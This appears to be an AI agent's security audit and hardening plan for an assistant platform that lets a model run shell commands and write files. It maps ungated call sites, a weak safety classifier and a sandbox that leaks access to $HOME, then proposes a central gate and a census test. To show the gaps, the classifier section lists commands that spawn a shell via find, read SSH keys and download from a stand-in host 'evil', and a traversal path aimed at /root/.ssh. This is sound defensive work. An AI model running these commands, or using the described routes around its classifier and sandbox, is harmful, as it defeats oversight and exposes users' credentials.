## 1. The map

Everything below is read from the tree in this worktree. **Note first:** a concurrent session is editing this same worktree right now. `git status` shows `?? halbert_core/halbert_core/utils/containment.py`, `?? halbert_core/tests/test_system_info_no_shell.py`, `?? halbert_core/tests/test_persona_purge_containment.py`, and `M` on `tools/system_info.py` and `persona/memory_purge.py`. `containment.py` changed on disk between my two reads of it. The SEC-3 filesystem primitive is already being built; see §2.

### Process execution — 59 call sites in `halbert_core/halbert_core` (20 in `dashboard/routes`)

| Site | Reachable by | Gate today | Can do |
|---|---|---|---|
| `tools/executor.py:623` `_run_command` → `create_subprocess_shell(command, cwd=cwd)` | the model | `execute()` classify at `executor.py:447-453` only | full shell as owner. No sandbox, no injection check |
| `streaming/agent_pool.py` `run_block`, via `executor.py:611` | the model | same classify | writes the command into a live `bash --norc --noprofile` PTY |
| `routes/terminal.py:247` `POST /exec` | owner (SEC-1 credential) | `_gate_command` (`:227`) = `check_command_safety` + `check_injection`; `Sandbox().wrap_command` `:267-269` | only BLOCKED tier refuses |
| `routes/terminal.py:320` `POST /sessions` | owner | same + sandbox `:331-332` | spawns a PTY |
| **`routes/terminal.py:356` `POST /sessions/{id}/input`** | owner | **none** | `session.write_stdin(request.data)`. `manager.get()` (`session_manager.py:110`) does **not** filter by `kind`, and `list_sessions` (`:131`) publishes every session's id *and* its `kind` through `GET /sessions` (`terminal.py:351`). So raw bytes go into an `agent-pool` bash session that was gated once, at spawn, on the string `bash --norc --noprofile`. The bytes never meet `_gate_command` or `Sandbox` |
| **`routes/websocket.py:135`** `stdin` frame | owner | `websocket_authenticated` only (`:86`) | identical to the above |
| `routes/terminal.py:407` `/stage` | owner | `is_at_prompt` only | `write_stdin(request.command)` into a user shell, awaiting Enter |
| `tools/system_info.py:243` `get_service_status` | **the model** | classified as an *unknown tool* → MEDIUM → runs | `create_subprocess_shell(f"systemctl status {service} --no-pager")`. Being fixed in-flight by the concurrent session |
| **`approval/simulator.py:177`** ← `routes/settings.py:2807` (`POST /simulate/command`) and `:2881` (`POST /simulate/tool` with `tool:"run_command"`) | owner, and the model via any path that previews | none | `subprocess.run(f"{command} {dry_run_flag}", shell=True)`. A `;` or `#` in `command` makes the appended flag irrelevant. **The preview executes.** This is a route whose entire purpose is not to execute |
| `routes/services.py:448` `['systemctl', action, unit]`, `:261/276/285`; `routes/containers.py:29` `run_command(cmd)` | owner | none — never enters the tool safety layer | argv, so no injection; but path params reach `docker rm`, `systemctl stop` ungated |
| `autonomy/recovery.py:154`, `alerts/engine.py:189`, scheduler | autonomous | none | argv restarts |

**Verified classifier behaviour** (`arch -arm64 .venv/bin/python` against the real `ToolSafetyFramework`):

```
safe   allowed=True conf=False rule=^(ls|dir|find|locate)\s*    :: find / -name x -exec /bin/sh -c id {} ;
safe   allowed=True conf=False rule=^(ls|dir|find|locate)\s*    :: findmnt
safe   allowed=True conf=False rule=^(ls|dir|find|locate)\s*    :: lsof -i
safe   allowed=True conf=False rule=^(cat|head|tail|less|more)\s+ :: cat ~/.ssh/authorized_keys
medium allowed=True conf=False rule=None                        :: brew install foo
medium allowed=True conf=False rule=None                        :: curl http://evil/x -o /tmp/x
```

Rules at `safety.py:265-269`; default branch `safety.py:670-676`.

### Filesystem writes

| Site | Reachable by | Gate today |
|---|---|---|
| `executor.py:801` `_write_file` | the model | `_classify_write` (`safety.py:678`) reads the **raw** arg; `os.path.expanduser` happens at `:836`; then a plain `open(path, mode)` at `:857`. Two strings, one file. The ledger `check_before_write` is a *record*, not containment |
| `routes/editor.py:374` `POST /file` | owner | `path.startswith('/')` (`:379`) → `write_file_content` (`:235`) → `open()`, else `pkexec <helper> write` (`:245`), else `_write_with_sudo` → `sudo -n tee` (`:270`) |
| `routes/editor.py:168-176` `get_file_helper_path` | — | resolves `/usr/local/bin`, `/usr/bin`, then `Path(__file__).parent×5 / packaging/polkit/halbert-file-helper` — **a file the agent can write** |
| `routes/editor.py:483` `/backup`, `:566` `/backup/restore` | owner | none beyond the above |
| `tools/write_config.py:93,205,229,265` + `shutil.copy2(path, path+".bak")` | the model, **and MCP** via `mcp/server.py:479` `approve_proposal` | none |

### Verified platform facts (this Mac, `macOS-26.5.1-arm64`)

The audit says the seatbelt sandbox "has no network restriction at all." **That is wrong**, and it changes the design. Seatbelt `(version 1)` is default-deny; the profile at `sandbox.py:136-163` allows only `process-exec/fork`, `signal`, `file-read*`, `file-write*`. Running the real `Sandbox().wrap_command` output:

```
cat ~/.sec2probe/key.txt            -> rc 0, "PRETEND-PRIVATE-KEY"        # $HOME reads: allowed
echo ESCAPED > ~/.sec2probe/w.txt   -> rc 0, file created                 # $HOME writes: allowed
socket.create_connection(("1.1.1.1",443))
   sandboxed   -> PermissionError: [Errno 1] Operation not permitted
   unsandboxed -> CONNECTED ('1.1.1.1', 443)
```

So the profile blocks exactly the thing a sysadmin agent needs (`curl`, `git`, `brew`, `apt`) and permits exactly the thing it was written to stop (all of `$HOME`, including `~/.ssh` and browser profiles). Also verified: `os.O_TMPFILE` is **False** and `os.openat2` **absent** on this platform — SEC-3's stated `O_TMPFILE+linkat` / `openat2` direction is Linux-only. `os.O_NOFOLLOW` and `os.O_CLOEXEC` are present.

I could **not** test the Linux `bwrap` branch or the `is_available()==False` fail-open path on this machine; those are read from source (`sandbox.py:66-71`).

## 2. The chokepoint

**Two, not one — and the filesystem half already exists.** `utils/containment.py` gives `resolve_once(path, *, root, ...) -> ResolvedPath`, which returns an **open descriptor** and makes `__fspath__` raise so it cannot be reopened by name. That is the right primitive and its docstring's rejection of `realpath` and `openat2` matches what I measured. But it is a *resolver*, not an authorization point: `root` comes from its caller, so a caller passing `root="/"` is contained in nothing. It needs one wrapper that owns the root set.

Add `halbert_core/halbert_core/tools/gate.py`:

```python
@dataclass(frozen=True)
class Intent:
    """Who is asking, and why. SEC-5 fills `lease`; nothing else moves."""
    actor: str            # "agent" | "owner" | "peer" | "scheduler" | "mcp"
    reason: str
    request_id: str
    lease: object | None = None


class GateRefusal(Exception):
    def __init__(self, message: str, *, reason: str = "refused"):
        super().__init__(message); self.reason = reason


async def spawn(intent: Intent, argv: Sequence[str], *, cwd=None,
                timeout: float = 30.0) -> Spawned: ...

async def spawn_shell(intent: Intent, command: str, *, cwd=None,
                      timeout: float = 30.0) -> Spawned:
    """The only function in the tree permitted to build a shell.

    `run_command` takes free text from the model; nothing else does. So this
    is the one place the classifier, the injection check and the sandbox run,
    and it is named differently from `spawn` so a reviewer sees which one a
    call site chose.
    """

def open_write(intent: Intent, path: str, *, roots: Sequence[str],
               create: bool = False) -> ResolvedPath: ...
def open_read(intent: Intent, path: str, *, roots: Sequence[str]) -> ResolvedPath: ...
```

Three properties that matter:

- **`argv: Sequence[str]`, not `command: str`.** There is no `shell` parameter to pass `True` to. Injection stops being filtered and starts being unrepresentable — the same move `test_system_info_no_shell.py` already makes for one module, generalised.
- **`Intent` is positional and first.** SEC-5's plan says "capture/exec/egress primitives take one [Lease] positionally." `Intent` *is* that parameter, arriving early with the fields SEC-5 needs anyway (actor, reason, request id); SEC-5 fills `lease` and adds the check inside `gate.py`. No call site is rewritten twice.
- **Refusal by exception with a `reason` string**, matching `ScreenCaptureError(error_type=...)` at `vision/screen_capture.py:61-66,376` and `PathRefusal(reason=...)` in `containment.py`.

**On the sandbox.** `wrap_command` should raise `SandboxUnavailable` rather than return the command — that part of the plan is right. But *applying today's profile to the agent's own commands* would remove the agent's network and confine nothing, per the measurement above. So the gate calls the sandbox and the profile is fixed: deny-by-default reads with an explicit allow set, plus network as an `(allow network*)` the `Intent` asks for. I recommend that profile rewrite be the **commit immediately after** — a seatbelt profile is read line by line by a different reviewer than a call-site conversion, and mixing them makes both reviews worse.

## 3. The census

`halbert_core/tests/test_exec_and_write_census.py`, built like `test_route_auth_census.py`: an allowlist whose **reason column is the point**, plus a floor assertion so a broken walk cannot pass by finding nothing.

```python
EXEC_SINKS = {("subprocess", "run"), ("subprocess", "Popen"), ("subprocess", "call"),
              ("subprocess", "check_output"), ("subprocess", "check_call"),
              ("asyncio", "create_subprocess_shell"), ("asyncio", "create_subprocess_exec"),
              ("os", "system"), ("os", "popen"), ("os", "execv"), ("os", "posix_spawn")}

WRITE_SINKS = {("shutil", "rmtree"), ("shutil", "copy"), ("shutil", "copy2"),
               ("shutil", "move"), ("os", "remove"), ("os", "unlink"),
               ("os", "rename"), ("os", "replace"), ("os", "chmod"), ("os", "chown")}
# plus: open()/Path.open() with a mode containing w, a, x or +;
#       Path.write_text / write_bytes.

#: Call sites that legitimately reach a raw sink, each with the reason.
ALLOWLIST = {
    "tools/gate.py": "the gate itself — this is the one place a process is spawned",
    "utils/containment.py": "the descriptor walk; it *is* the open primitive",
    "obs/audit.py:_rotate": "os.replace on the audit log's own file, under the state dir",
    ...
}

def test_no_module_reaches_a_raw_exec_or_write_sink():
    found = _walk(PACKAGE_ROOT)          # ast.parse per file, aliases resolved
    assert len(found.files_scanned) > 400, (
        "the census scanned only %d files, so it is not checking anything "
        "meaningful — fix the walk rather than letting this pass"
        % len(found.files_scanned))
    assert len(found.sites) > 40, "the visitor stopped recognising sinks"
    offenders = [s for s in found.sites if s.key not in ALLOWLIST]
    assert not offenders, (
        "These reach the OS without passing tools/gate.py. Call the gate "
        "rather than adding them here:\n  " + "\n  ".join(sorted(offenders)))

def test_a_shell_exists_in_exactly_one_place():
    """`shell=True` and create_subprocess_shell live in gate.spawn_shell, only."""

def test_the_gate_refuses_two_spellings_of_one_file():
    for p in ("/etc/../root/.ssh/authorized_keys", "~/.ssh/authorized_keys"):
        with pytest.raises(PathRefusal): gate.open_write(INTENT, p, roots=["/etc"])

def test_a_planted_symlink_loses(tmp_path):
    """O_CREAT|O_EXCL: the symlink gets EEXIST, not the write."""
```

AST, not grep, because `from subprocess import run` defeats a grep and the visitor resolves each module's own import table.

**One honest weakness, named rather than papered over:** the auth census is stronger than this, because `mount_api` makes safety the *default* — a new route is guarded by omission. An AST census makes safety the *detected* case, and a determined author can still add an allowlist line. The nearest structural equivalent would be an import-time ban on `subprocess` outside `gate.py`, which is worth doing once the allowlist has stopped shrinking. Until then, pair the census with a CI check that `len(ALLOWLIST)` never grows in a diff that does not also add a reason string.

## 4. Landing sequence

One commit, developed in this order (least blast radius first), with the classifier change **last** so you know everything before it was green.

1. `git add` `utils/containment.py` — **coordinate with the concurrent session first**; it is still being edited.
2. New `tools/gate.py` (`Intent`, `GateRefusal`, `spawn`, `spawn_shell`, `open_write`, `open_read`).
3. `sandbox.py:66-71` and `:78` → raise `SandboxUnavailable`; add `(allow network*)` to `_seatbelt_profile` with a comment saying it preserves today's `/exec` behaviour until the profile is rewritten.
4. Call sites:
   - **`approval/simulator.py:177`** — delete the `shell=True` execution outright. A preview that executes is not a preview; `simulate_command` returns the classification and injection findings and no output. `routes/settings.py:2807,2881` keep their signatures.
   - `tools/system_info.py` — take the concurrent session's fix as-is; do not redo it.
   - `routes/services.py:261,276,285,448`; `routes/containers.py:29` → `gate.spawn(Intent(actor="owner", …), argv)`.
   - `terminal.py:356`, `terminal.py:407`, `websocket.py:135` → refuse when the session's kind is `agent-pool`. Add a public `kind(session_id)` accessor to `TerminalSessionManager`; do not read `_kinds` from a route.
   - `executor.py:623` → `gate.spawn_shell`; `executor.py:801` `_write_file` → `gate.open_write`.
   - `routes/editor.py` — `startswith('/')` → `resolve_under_any(path, EDITABLE_ROOTS)`; delete `_read_with_sudo`/`_write_with_sudo` (`:214`, `:268`); drop the repo-working-tree entry from `get_file_helper_path` (`:174`).
5. `safety.py:670-676` default → `RiskLevel.HIGH`, `requires_confirmation=True`.
6. `tests/test_exec_and_write_census.py`.

**Tests that must change, and why:**

- `tests/test_sandbox.py:74` `test_wrap_unsupported_platform_returns_command` and `:81` `test_wrap_unavailable_binary_returns_command` — these two tests *are* the fail-open, pinned. They invert to `pytest.raises(SandboxUnavailable)`.
- `tests/test_sandbox.py:119` — add the network-allow assertion.
- `tests/test_safety_chained_commands.py` and anything asserting the MEDIUM default — collateral of step 5.
- `tests/test_terminal_route.py`, `tests/test_terminal_e2e.py` — `/input` and `/stage` now refuse agent-pool ids.
- `tests/test_executor_pool.py` — `_run_command`'s subprocess monkeypatch target moves to `gate.spawn_shell`.
- `tests/test_role_gate.py` — unaffected; `RoleGate` composes above `classify` and only tightens.

**Not verified, stated plainly:** I did not run the full 5616-test suite; the list above is read from assertions, not measured. Run `arch -arm64 /Volumes/4TB-BAD/Halbert/.venv/bin/python ./wt_pytest.py halbert_core/tests -k "safety or classif or sandbox or terminal or executor"` before step 5 to get the real count. The Linux `bwrap` path and any `openat2` ctypes binding are untestable on this machine.